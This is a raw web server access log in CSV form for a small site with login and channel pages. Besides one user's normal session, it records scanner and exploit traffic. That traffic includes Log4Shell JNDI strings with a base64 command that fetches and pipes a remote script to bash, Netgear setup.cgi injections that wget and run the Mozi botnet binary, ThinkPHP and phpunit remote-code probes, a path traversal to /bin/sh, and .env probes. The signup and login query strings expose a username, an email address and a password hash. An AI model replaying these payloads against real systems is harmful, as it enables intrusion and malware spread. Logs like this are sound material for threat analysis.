"Source","StatusCode","Timestamp","URL"
"103.144.149.211","200","1639338550207","/"
"103.144.149.211","200","1639338550688","/public.css"
"103.144.149.211","200","1639338550692","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338550700","/public.js"
"103.144.149.211","200","1639338551493","/getbasicinfo.ajax"
"103.144.149.211","200","1639338551695","/ico.png"
"103.144.149.211","200","1639338551720","/login.html"
"103.144.149.211","200","1639338551970","/public.css"
"103.144.149.211","200","1639338551976","/hash.js"
"103.144.149.211","200","1639338551973","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338551977","/public.js"
"103.144.149.211","200","1639338552239","/UOP.png"
"103.144.149.211","200","1639338552580","/UOP2.png"
"103.144.149.211","200","1639338552839","/ico.png"
"103.144.149.211","200","1639338554285","/signup.html"
"103.144.149.211","200","1639338554531","/public.css"
"103.144.149.211","200","1639338554539","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338554541","/public.js"
"103.144.149.211","200","1639338554542","/hash.js"
"103.144.149.211","200","1639338554767","/UOP.png"
"103.144.149.211","200","1639338555338","/UOP2.png"
"103.144.149.211","200","1639338571277","/signup.ajax?Username=qc5111&Nickname=York&Email=247731705%40qq.com&Password=d6ae33474b8621b5afce6fe38550b59d4d189151"
"103.144.149.211","200","1639338573516","/index.html"
"103.144.149.211","200","1639338573990","/public.css"
"103.144.149.211","200","1639338573993","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338573996","/public.js"
"103.144.149.211","200","1639338574841","/getbasicinfo.ajax"
"103.144.149.211","200","1639338577077","/channel.html"
"103.144.149.211","200","1639338577324","/public.css"
"103.144.149.211","200","1639338577334","/public.js"
"103.144.149.211","200","1639338577335","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338577595","/UOP.png"
"103.144.149.211","200","1639338578142","/UOP2.png"
"103.144.149.211","200","1639338578151","/getbasicinfo.ajax"
"103.144.149.211","200","1639338582579","/createchannel.ajax?ChannelName=Root%20Channel"
"103.144.149.211","200","1639338582810","/getbasicinfo.ajax"
"103.144.149.211","200","1639338586028","/index.html"
"103.144.149.211","200","1639338586284","/public.css"
"103.144.149.211","200","1639338586516","/public.js"
"103.144.149.211","200","1639338586521","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338587322","/getbasicinfo.ajax"
"103.144.149.211","200","1639338664949","/index.html"
"103.144.149.211","200","1639338665420","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338665423","/public.css"
"103.144.149.211","200","1639338665424","/public.js"
"103.144.149.211","200","1639338666058","/getbasicinfo.ajax"
"103.144.149.211","200","1639338666149","/ico.png"
"103.144.149.211","200","1639338683643","/logout.ajax"
"103.144.149.211","200","1639338683872","/login.html"
"103.144.149.211","200","1639338684132","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338684345","/public.css"
"103.144.149.211","200","1639338684349","/public.js"
"103.144.149.211","200","1639338684352","/hash.js"
"103.144.149.211","200","1639338684604","/UOP.png"
"103.144.149.211","200","1639338684752","/UOP2.png"
"103.144.149.211","200","1639338686799","/login.ajax?Username=qc5111&Password=d6ae33474b8621b5afce6fe38550b59d4d189151"
"103.144.149.211","200","1639338688040","/index.html"
"103.144.149.211","200","1639338688301","/public.css"
"103.144.149.211","200","1639338688307","/public.js"
"103.144.149.211","200","1639338688310","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338688958","/getbasicinfo.ajax"
"52.114.14.71","200","1639338725765","/"
"52.114.14.71","200","1639338725923","/ico.png"
"104.47.10.254","200","1639338731521","/"
"103.144.149.211","200","1639338732025","/"
"103.144.149.211","200","1639338732501","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338732503","/public.css"
"103.144.149.211","200","1639338732504","/public.js"
"103.144.149.211","200","1639338733139","/getbasicinfo.ajax"
"40.94.104.18","200","1639338741635","/"
"40.94.104.45","200","1639338742206","/public.css"
"40.94.104.34","200","1639338742213","/jquery-3-6-0-min.js"
"40.94.104.36","200","1639338742216","/public.js"
"40.94.104.34","200","1639338742399","/getbasicinfo.ajax"
"40.94.104.34","200","1639338742661","/login.html"
"40.94.104.34","200","1639338742759","/public.css"
"40.94.104.36","200","1639338742762","/jquery-3-6-0-min.js"
"40.94.104.45","200","1639338742763","/public.js"
"40.94.104.20","200","1639338742792","/hash.js"
"40.94.104.20","200","1639338742822","/UOP.png"
"40.94.104.36","200","1639338742853","/UOP2.png"
"40.94.104.20","200","1639338745614","/ico.png"
"103.144.149.211","200","1639338780416","/"
"103.144.149.211","200","1639338780893","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338780896","/public.js"
"103.144.149.211","200","1639338780898","/public.css"
"103.144.149.211","200","1639338781703","/getbasicinfo.ajax"
"103.144.149.211","200","1639338799759","/channel.html"
"103.144.149.211","200","1639338800014","/public.css"
"103.144.149.211","200","1639338800237","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338800241","/public.js"
"103.144.149.211","200","1639338800495","/UOP.png"
"103.144.149.211","200","1639338800870","/UOP2.png"
"103.144.149.211","200","1639338800884","/getbasicinfo.ajax"
"103.144.149.211","200","1639338802239","/index.html"
"103.144.149.211","200","1639338802505","/public.css"
"103.144.149.211","200","1639338802512","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338802514","/public.js"
"103.144.149.211","200","1639338803146","/getbasicinfo.ajax"
"103.144.149.211","200","1639338822791","/public.css"
"103.144.149.211","200","1639338827244","/logout.ajax"
"103.144.149.211","200","1639338827487","/login.html"
"103.144.149.211","200","1639338827738","/public.css"
"103.144.149.211","200","1639338827956","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338827966","/hash.js"
"103.144.149.211","200","1639338827969","/public.js"
"103.144.149.211","200","1639338828226","/UOP.png"
"103.144.149.211","200","1639338828583","/UOP2.png"
"42.194.128.22","200","1639338843049","/"
"101.89.29.78","200","1639338897510","/"
"101.89.29.78","200","1639338898098","/jquery-3-6-0-min.js"
"101.89.29.78","200","1639338900322","/public.js"
"61.151.178.163","200","1639338902388","/"
"61.151.178.163","200","1639338904371","/jquery-3-6-0-min.js"
"61.151.178.163","200","1639338905938","/public.js"
"103.144.149.211","200","1639338928002","/login.html"
"103.144.149.211","200","1639338928271","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338928466","/public.css"
"103.144.149.211","200","1639338928479","/hash.js"
"103.144.149.211","200","1639338928481","/public.js"
"103.144.149.211","200","1639338928732","/UOP.png"
"103.144.149.211","200","1639338929068","/UOP2.png"
"103.144.149.211","200","1639338929350","/ico.png"
"103.144.149.211","200","1639338930850","/login.ajax?Username=qc5111&Password=d6ae33474b8621b5afce6fe38550b59d4d189151"
"103.144.149.211","200","1639338932104","/index.html"
"103.144.149.211","200","1639338932356","/public.css"
"103.144.149.211","200","1639338932359","/public.js"
"103.144.149.211","200","1639338932360","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639338932990","/getbasicinfo.ajax"
"188.208.63.189","200","1639340357850","/"
"192.241.212.85","415","1639341135173","/manager/text/list"
"137.184.214.146","415","1639342333171","/.env"
"137.184.214.146","200","1639342334351","/"
"170.187.155.78","200","1639347265369","/"
"170.187.155.78","200","1639347265678","/"
"170.187.155.78","200","1639347265990","/"
"170.187.155.78","415","1639347266571","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"195.54.160.149","415","1639347701218","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"170.187.155.78","415","1639347824345","/nmaplowercheck1639347823"
"170.187.155.78","200","1639347824397","/"
"170.187.155.78","415","1639347824560","/evox/about"
"170.187.155.78","415","1639347885047","/sdk"
"117.215.242.3","415","1639348151879","/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.215.242.3:58792/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
"136.144.41.117","200","1639348165910","/"
"195.54.160.149","415","1639349040220","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"137.184.214.146","415","1639350354098","/.env"
"137.184.214.146","200","1639350354369","/"
"195.54.160.149","415","1639350717127","/solr/admin/info/system?wt=json"
"221.130.37.172","200","1639351191037","/"
"221.130.37.172","200","1639351195512","//public.js"
"162.142.125.60","200","1639351512681","/"
"162.142.125.60","200","1639351512862","/"
"58.152.81.222","200","1639351532577","/"
"58.152.81.222","200","1639351532878","/public.css"
"58.152.81.222","200","1639351533123","/jquery-3-6-0-min.js"
"58.152.81.222","200","1639351533124","/public.js"
"58.152.81.222","200","1639351533471","/ico.png"
"58.152.81.222","200","1639351545157","/"
"58.152.81.222","200","1639351545502","/public.css"
"58.152.81.222","200","1639351545733","/public.js"
"58.152.81.222","200","1639351545735","/jquery-3-6-0-min.js"
"58.152.81.222","200","1639351546417","/getbasicinfo.ajax"
"58.152.81.222","200","1639351546535","/ico.png"
"58.152.81.222","200","1639351546700","/login.html"
"58.152.81.222","200","1639351547012","/jquery-3-6-0-min.js"
"58.152.81.222","200","1639351547013","/public.js"
"58.152.81.222","200","1639351547015","/public.css"
"58.152.81.222","200","1639351547248","/hash.js"
"58.152.81.222","200","1639351547330","/UOP.png"
"58.152.81.222","200","1639351547500","/UOP2.png"
"58.152.81.222","200","1639351547832","/ico.png"
"192.241.214.138","415","1639352606434","/manager/html"
"195.54.160.149","415","1639353124844","/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21"
"20.62.170.142","200","1639355149959","/"
"20.62.170.142","200","1639355150141","/"
"20.62.170.142","200","1639355150308","/"
"20.62.170.142","415","1639355150634","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"195.54.160.149","415","1639355658405","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"195.54.160.149","415","1639356839814","/?XDEBUG_SESSION_START=phpstorm"
"165.227.43.42","200","1639361065768","/"
"209.141.50.223","415","1639361174974","/config/getuser?index=0"
"120.211.140.116","200","1639362083591","/"
"120.211.140.116","200","1639362083790","/"
"120.211.140.116","200","1639362083983","/"
"120.211.140.116","200","1639362084191","/"
"137.184.214.146","415","1639363187255","/.env"
"137.184.214.146","200","1639363187727","/"
"95.65.50.236","200","1639365313372","/"
"195.54.160.149","200","1639366162224","/"
"34.221.121.98","200","1639366841475","/"
"184.105.139.69","200","1639367459950","/"
"209.17.97.2","200","1639367798759","/"
"195.54.160.149","415","1639368164829","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"195.54.160.149","415","1639371126025","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"209.141.54.111","415","1639372467607","/api/openapi/common/getDownloadUrl?lang=yn_YN"
"137.184.214.146","415","1639376170572","/.env"
"137.184.214.146","200","1639376174303","/"
"103.144.149.211","200","1639376366653","/"
"103.144.149.211","200","1639376367130","/public.js"
"103.144.149.211","200","1639376367132","/public.css"
"103.144.149.211","200","1639376367135","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639376367970","/getbasicinfo.ajax"
"103.144.149.211","200","1639376368069","/ico.png"
"103.144.149.211","200","1639376368221","/login.html"
"103.144.149.211","200","1639376368476","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639376368477","/hash.js"
"103.144.149.211","200","1639376368479","/public.css"
"103.144.149.211","200","1639376368478","/public.js"
"103.144.149.211","200","1639376368745","/UOP.png"
"103.144.149.211","200","1639376369102","/UOP2.png"
"103.144.149.211","200","1639376369353","/ico.png"
"103.144.149.211","200","1639377891644","/"
"103.144.149.211","200","1639377892123","/public.js"
"103.144.149.211","200","1639377892125","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639377892129","/public.css"
"103.144.149.211","200","1639377892765","/getbasicinfo.ajax"
"101.91.60.89","200","1639380108125","/login.html"
"101.91.60.89","200","1639380140370","/jquery-3-6-0-min.js"
"101.91.60.89","200","1639380231366","/public.js"
"101.91.60.89","200","1639380254946","/hash.js"
"121.5.219.20","200","1639382597180","/public.js"
"137.184.214.146","415","1639382889368","/.env"
"137.184.214.146","200","1639382889577","/"
"167.172.44.255","200","1639383902048","/"
"5.188.210.227","415","1639385643701","http://5.188.210.227/echo.php"
"103.144.149.211","200","1639385765601","/"
"103.144.149.211","200","1639385765883","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639385766089","/public.css"
"103.144.149.211","200","1639385766099","/public.js"
"103.144.149.211","200","1639385766689","/getbasicinfo.ajax"
"1.116.59.211","200","1639386360679","/"
"1.116.59.211","200","1639386360916","/"
"1.116.59.211","200","1639386361151","/"
"1.116.59.211","200","1639386361385","/"
"45.61.185.177","415","1639386810308","/login"
"103.144.149.211","200","1639386919579","/"
"103.144.149.211","200","1639386920066","/public.css"
"103.144.149.211","200","1639386920067","/public.js"
"103.144.149.211","200","1639386920071","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639386920709","/getbasicinfo.ajax"
"110.136.138.94","200","1639387224618","/"
"190.94.138.163","200","1639387341696","/"
"199.19.224.76","415","1639389982286","/api/openapi/common/getDownloadUrl?lang=yn_YN"
"167.172.44.255","200","1639392023021","/"
"167.172.44.255","200","1639393246695","/"
"137.184.214.146","415","1639397162411","/.env"
"137.184.214.146","200","1639397163897","/"
"103.144.149.211","200","1639397285416","/"
"103.144.149.211","200","1639397285941","/public.css"
"103.144.149.211","200","1639397286170","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639397286173","/public.js"
"103.144.149.211","200","1639397286812","/getbasicinfo.ajax"
"103.144.149.211","200","1639397286981","/ico.png"
"186.33.72.209","200","1639398458391","/"
"103.144.149.211","200","1639399785419","/"
"103.144.149.211","200","1639399785895","/public.css"
"103.144.149.211","200","1639399785898","/jquery-3-6-0-min.js"
"103.144.149.211","200","1639399785901","/public.js"
"103.144.149.211","200","1639399786544","/getbasicinfo.ajax"
"103.144.149.211","200","1639399786701","/ico.png"
"45.137.23.246","200","1639399858191","/"
"103.144.149.211","415","1639399992710","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"103.144.149.211","404","1639399993167","/favicon.ico"
"20.211.30.34","415","1639403304327","/robots.txt"
"60.191.125.35","415","1639407147742","http://112.124.42.80:63435/"
"124.227.31.47","415","1639407170834","http://110.242.68.4/"
"162.142.125.57","200","1639408524673","/"
"162.142.125.57","200","1639408524880","/"
"167.172.44.255","200","1639415205858","/"
"198.98.49.124","200","1639415990224","/"
"192.241.214.165","200","1639416446982","/"
"114.55.130.93","200","1639417128768","/"
"167.172.44.255","200","1639417180962","/"
"137.184.214.146","415","1639417384179","/.env"
"137.184.214.146","200","1639417384496","/"
"209.141.50.223","415","1639419181905","/config/getuser?index=0"
"45.137.21.9","415","1639419205062","/dispatch.asp"
"195.54.160.149","415","1639421364534","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"195.54.160.149","415","1639421520932","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"20.55.53.144","200","1639422420705","/"
"195.54.160.149","415","1639424633565","/solr/admin/info/system?wt=json"
"205.185.124.100","415","1639425030170","/boaform/admin/formLogin"
"195.54.160.149","415","1639427216543","/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21"
"209.17.96.106","200","1639427748704","/"
"109.237.103.123","415","1639428376174","/.env"
"137.184.214.146","415","1639428557184","/.env"
"137.184.214.146","200","1639428557562","/"
"177.200.94.102","200","1639429500834","/"
"195.54.160.149","415","1639429656811","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"20.211.30.34","415","1639432013796","/pv/spa112.cfg"
"72.175.33.110","200","1639432077264","/"
"195.54.160.149","415","1639432243572","/?XDEBUG_SESSION_START=phpstorm"
"69.174.99.144","200","1639432488358","/"
"209.17.97.18","200","1639432535125","/"
"195.54.160.149","415","1639432786918","/console/"
"102.130.245.123","200","1639433908312","/"
"45.137.21.9","415","1639434013527","/dispatch.asp"
"195.54.160.149","415","1639435044501","/Autodiscover/Autodiscover.xml"
"47.92.38.53","200","1639435265514","/"
"198.98.49.124","415","1639435391689","/config/getuser?index=0"
"52.143.120.119","200","1639438533850","/"
"52.143.120.119","200","1639438534131","/"
"52.143.120.119","200","1639438534420","/"
"52.143.120.119","415","1639438534997","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"195.54.160.149","415","1639438634611","/_ignition/execute-solution"
"137.184.214.146","415","1639438647874","/.env"
"137.184.214.146","200","1639438648150","/"
"195.54.160.149","415","1639442060114","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"20.211.30.34","200","1639442774588","/"
"157.245.70.127","415","1639443256621","/ab2g"
"157.245.70.127","415","1639443261641","/ab2h"
"162.62.191.231","200","1639444017838","/"
"103.114.158.1","200","1639444045654","/"
"205.185.116.89","200","1639444046177","/"
"205.185.122.184","200","1639444046745","/jquery-3-6-0-min.js"
"103.114.158.1","200","1639444046895","/public.js"
"209.141.33.65","200","1639444048069","/getbasicinfo.ajax"
"209.141.41.193","200","1639444048638","/login.html"
"209.141.51.222","200","1639444049205","/public.js"
"205.185.117.203","200","1639444049209","/hash.js"
"103.114.158.1","200","1639444049321","/jquery-3-6-0-min.js"
"205.185.116.25","200","1639444052263","/ico.png"
"195.54.160.149","200","1639445076139","/"
"195.54.160.149","415","1639446762332","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"47.103.113.44","200","1639448084845","/"
"92.118.160.57","200","1639450019847","/"
"198.98.51.250","415","1639450236923","/api/openapi/common/getDownloadUrl?lang=yn_YN"
"74.82.47.4","200","1639452415152","/"
"120.85.114.28","415","1639453511845","/HNAP1/"
"45.190.156.76","200","1639456959764","/"
"178.73.215.171","200","1639457728238","/"
"124.224.87.11","200","1639457851703","/"
"1.202.113.127","415","1639457852609","http://110.242.68.4/"
"124.224.87.11","200","1639457855276","/"
"124.224.87.11","200","1639457855866","/"
"124.224.87.11","200","1639457859436","/"
"199.195.251.138","404","1639459232702","/java_script/template_1/common.js"
"198.98.49.124","200","1639459945395","/"
"137.184.214.146","415","1639460633434","/.env"
"137.184.214.146","200","1639460634021","/"
"115.49.75.221","415","1639463684079","/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.49.75.221:47639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
"167.71.174.167","200","1639468768071","/"
"137.184.214.146","415","1639469148830","/.env"
"137.184.214.146","200","1639469150076","/"
"88.126.65.2","200","1639471154734","/"
"167.86.70.252","200","1639471647614","/"
"209.141.50.223","415","1639473276526","/config/getuser?index=0"
"88.80.186.144","200","1639474254245","/"
"88.80.186.144","200","1639474254320","/"
"88.80.186.144","200","1639474254386","/"
"88.80.186.144","415","1639474254471","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"88.80.186.144","200","1639474259832","/"
"88.80.186.144","415","1639474259993","/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42"
"88.80.186.144","415","1639474260046","/scripts/WPnBr.dll"
"88.80.186.144","200","1639474260145","/"
"88.80.186.144","404","1639474260247","/CSS/Miniweb.css"
"88.80.186.144","415","1639474260295","/8zhB"
"88.80.186.144","415","1639474260344","/server-status"
"88.80.186.144","415","1639474260395","/sdk"
"88.80.186.144","415","1639474260445","/default.jsp"
"88.80.186.144","415","1639474260494","/Portal/Portal.mwsl"
"88.80.186.144","415","1639474260554","/nmaplowercheck1639474259"
"88.80.186.144","415","1639474260603","/.git/HEAD"
"88.80.186.144","415","1639474260651","/Portal0000.htm"
"88.80.186.144","415","1639474260751","/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"
"88.80.186.144","200","1639474260801","/"
"88.80.186.144","200","1639474260901","/"
"88.80.186.144","415","1639474260957","/localstart.jhtml"
"88.80.186.144","415","1639474261006","/docs/cplugError.html/"
"88.80.186.144","415","1639474261059","/pools/default/buckets"
"88.80.186.144","415","1639474261109","/HNAP1"
"88.80.186.144","200","1639474261162","/ico.png"
"88.80.186.144","415","1639474261163","/__Additional"
"88.80.186.144","415","1639474261225","/start.jsp"
"88.80.186.144","415","1639474261226","/pools"
"88.80.186.144","415","1639474261364","/base.jsp"
"88.80.186.144","415","1639474261517","/admin.pl"
"88.80.186.144","415","1639474261670","/main.cfm"
"88.80.186.144","415","1639474261824","/indice.jhtml"
"88.80.186.144","415","1639474261975","/localstart.jsa"
"88.80.186.144","415","1639474262129","/index.aspx"
"88.80.186.144","415","1639474262280","/menu.jhtml"
"88.80.186.144","415","1639474262431","/robots.txt"
"88.80.186.144","415","1639474262582","/readme.txt"
"88.80.186.144","415","1639474262731","/admin.jsp"
"88.80.186.144","404","1639474262881","/inicio.html"
"88.80.186.144","415","1639474263032","/admin.php"
"88.80.186.144","415","1639474263183","/admin.shtml"
"88.80.186.144","415","1639474263333","/indice.jsp"
"88.80.186.144","415","1639474263483","/localstart.shtml"
"88.80.186.144","415","1639474263634","/admin.jhtml"
"88.80.186.144","415","1639474263783","/default.aspx"
"88.80.186.144","415","1639474263933","/localstart.asp"
"88.80.186.144","415","1639474264084","/main.shtml"
"88.80.186.144","415","1639474264233","/admin.jsa"
"88.80.186.144","415","1639474264383","/inicio.jsa"
"88.80.186.144","415","1639474264533","/menu.asp"
"88.80.186.144","415","1639474264684","/inicio.cfm"
"88.80.186.144","415","1639474264834","/base.jsa"
"88.80.186.144","415","1639474264985","/localstart.cgi"
"88.80.186.144","415","1639474265135","/default.pl"
"88.80.186.144","415","1639474265286","/inicio.jsp"
"88.80.186.144","415","1639474265435","/start.aspx"
"88.80.186.144","415","1639474265586","/indice.aspx"
"88.80.186.144","415","1639474265735","/start.cfm"
"88.80.186.144","415","1639474266101","/menu.aspx"
"88.80.186.144","415","1639474266185","/admin.asp"
"88.80.186.144","415","1639474266334","/index.jsa"
"88.80.186.144","415","1639474266485","/index.pl"
"88.80.186.144","415","1639474266636","/base.shtml"
"88.80.186.144","415","1639474266786","/index.jhtml"
"88.80.186.144","415","1639474266937","/base.pl"
"88.80.186.144","415","1639474267089","/home.jsa"
"88.80.186.144","415","1639474267239","/indice.cgi"
"88.80.186.144","415","1639474267390","/base.php"
"88.80.186.144","415","1639474267539","/admin.cfm"
"88.80.186.144","415","1639474267689","/default.jhtml"
"88.80.186.144","415","1639474267838","/default.cgi"
"88.80.186.144","415","1639474267989","/menu.cgi"
"88.80.186.144","415","1639474268140","/localstart.pl"
"88.80.186.144","415","1639474268289","/indice.asp"
"88.80.186.144","415","1639474268440","/menu.cfm"
"88.80.186.144","404","1639474268588","/menu.html"
"88.80.186.144","415","1639474268738","/menu.jsa"
"88.80.186.144","415","1639474268888","/home.jhtml"
"88.80.186.144","415","1639474269049","/base.cgi"
"88.80.186.144","415","1639474269187","/base.cfm"
"88.80.186.144","415","1639474269336","/home.aspx"
"88.80.186.144","415","1639474269486","/home.cfm"
"88.80.186.144","415","1639474269635","/base.aspx"
"88.80.186.144","415","1639474269785","/localstart.cfm"
"88.80.186.144","415","1639474269881","/home.jsp"
"88.80.186.144","415","1639474269920","/start.jsa"
"88.80.186.144","415","1639474269954","/indice.shtml"
"88.80.186.144","415","1639474269984","/main.pl"
"88.80.186.144","415","1639474270016","/indice.pl"
"88.80.186.144","415","1639474270048","/indice.php"
"88.80.186.144","415","1639474270079","/admin.cgi"
"88.80.186.144","415","1639474270110","/indice.jsa"
"88.80.186.144","404","1639474270142","/indice.html"
"88.80.186.144","415","1639474270173","/menu.php"
"88.80.186.144","415","1639474270205","/inicio.jhtml"
"88.80.186.144","415","1639474270236","/indice.cfm"
"88.80.186.144","415","1639474270267","/index.shtml"
"88.80.186.144","415","1639474270298","/main.jhtml"
"88.80.186.144","404","1639474270330","/base.html"
"88.80.186.144","415","1639474270363","/inicio.shtml"
"88.80.186.144","415","1639474270395","/inicio.pl"
"88.80.186.144","415","1639474270427","/index.jsp"
"88.80.186.144","415","1639474270459","/admin.aspx"
"88.80.186.144","415","1639474270490","/home.asp"
"88.80.186.144","200","1639474270522","/index.html"
"88.80.186.144","415","1639474270575","/inicio.aspx"
"88.80.186.144","404","1639474270606","/start.html"
"88.80.186.144","415","1639474270671","/inicio.asp"
"88.80.186.144","415","1639474270701","/home.pl"
"88.80.186.144","415","1639474270732","/default.jsa"
"88.80.186.144","415","1639474270763","/base.inc"
"88.80.186.144","415","1639474270793","/localstart.php"
"88.80.186.144","415","1639474270824","/start.shtml"
"88.80.186.144","404","1639474270854","/localstart.html"
"88.80.186.144","415","1639474270885","/main.asp"
"88.80.186.144","415","1639474270915","/start.php"
"88.80.186.144","415","1639474270946","/base.asp"
"88.80.186.144","415","1639474270977","/start.pl"
"88.80.186.144","415","1639474271010","/localstart.aspx"
"88.80.186.144","404","1639474271043","/admin.html"
"88.80.186.144","415","1639474271073","/default.php"
"88.80.186.144","415","1639474271105","/localstart.jsp"
"88.80.186.144","415","1639474271137","/base.jhtml"
"88.80.186.144","415","1639474271175","/menu.pl"
"88.80.186.144","415","1639474271210","/main.cgi"
"88.80.186.144","415","1639474271240","/start.cgi"
"88.80.186.144","415","1639474271271","/default.shtml"
"88.80.186.144","415","1639474271304","/index.asp"
"88.80.186.144","415","1639474271336","/menu.jsp"
"88.80.186.144","415","1639474271369","/inicio.php"
"88.80.186.144","415","1639474271400","/index.cgi"
"88.80.186.144","415","1639474271431","/start.asp"
"88.80.186.144","415","1639474271462","/inicio.cgi"
"88.80.186.144","415","1639474271493","/main.jsp"
"88.80.186.144","415","1639474271525","/main.jsa"
"88.80.186.144","415","1639474271556","/home.shtml"
"88.80.186.144","415","1639474271587","/index.cfm"
"88.80.186.144","415","1639474271619","/start.jhtml"
"88.80.186.144","404","1639474271656","/default.html"
"88.80.186.144","415","1639474271688","/menu.shtml"
"88.80.186.144","415","1639474271720","/main.aspx"
"88.80.186.144","415","1639474271753","/default.cfm"
"88.80.186.144","404","1639474271785","/home.html"
"88.80.186.144","415","1639474271817","/index.php"
"88.80.186.144","404","1639474271849","/main.html"
"88.80.186.144","415","1639474271880","/home.php"
"88.80.186.144","415","1639474271916","/home.cgi"
"88.80.186.144","415","1639474271948","/default.asp"
"88.80.186.144","415","1639474271979","/main.php"
"88.80.186.144","200","1639474272064","/"
"45.61.187.251","415","1639474274730","/login"
"66.240.236.116","200","1639475862923","/"
"96.19.238.67","415","1639478625423","/.env"
"96.19.238.67","200","1639478626059","/"
"162.142.125.42","200","1639478714809","/"
"162.142.125.42","200","1639478714990","/"
"205.185.114.192","415","1639478944653","/odd/app/download/list"
"34.65.197.94","200","1639479934582","/"
"34.65.197.94","415","1639479935930","/HNAP1/"
"136.144.41.117","200","1639480610177","/"
"185.180.143.79","200","1639487075442","/"
"185.220.100.254","200","1639487815078","/"
"23.129.64.133","404","1639487820137","/favicon.ico"
"95.215.65.176","200","1639488134323","/"
"157.230.21.24","415","1639492508062","/invoker/readonly"
"157.230.21.24","415","1639492508093","/_ignition/execute-solution"
"157.230.21.24","415","1639492508128","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"157.230.21.24","200","1639492508159","/"
"157.230.21.24","415","1639492508190","/script"
"157.230.21.24","415","1639492508221","/login"
"157.230.21.24","415","1639492508251","/jenkins/login"
"157.230.21.24","415","1639492508282","/manager/html"
"157.230.21.24","415","1639492508310","/wp-login.php"
"157.230.21.24","415","1639492508341","/?s=/Index/\think\app/invokefunction&function=call_user_func_array&Vars[0]=md5&Vars[1][]=qxzhwoo3"
"195.54.160.149","415","1639493148899","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"20.55.53.144","415","1639493244223","/kINlo0YqM8ADiTpr5abdHFwWeyF"
"120.86.253.39","415","1639493849466","/GponForm/diag_Form?images/"
"45.137.23.232","200","1639495799079","/"
"195.54.160.149","415","1639496739752","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"195.54.160.149","415","1639497490130","/solr/admin/info/system?wt=json"
"195.54.160.149","415","1639499409560","/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21"
"80.82.77.192","200","1639501652280","/"
"192.241.211.125","200","1639503285776","/"
"198.98.49.124","200","1639503567734","/"
"152.32.131.196","200","1639504233481","/"
"192.241.213.80","415","1639506648590","/portal/redlion"
"209.17.97.58","200","1639507080310","/"
"195.54.160.149","415","1639508150995","/Autodiscover/Autodiscover.xml"
"195.54.160.149","415","1639509613093","/_ignition/execute-solution"
"192.241.215.152","415","1639510608586","/actuator/health"
"209.141.50.223","415","1639511291606","/config/getuser?index=0"
"195.54.160.149","200","1639512288961","/"
"195.54.160.149","415","1639514345569","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"195.54.160.149","200","1639516009951","/"
"162.255.202.246","200","1639517122251","/"
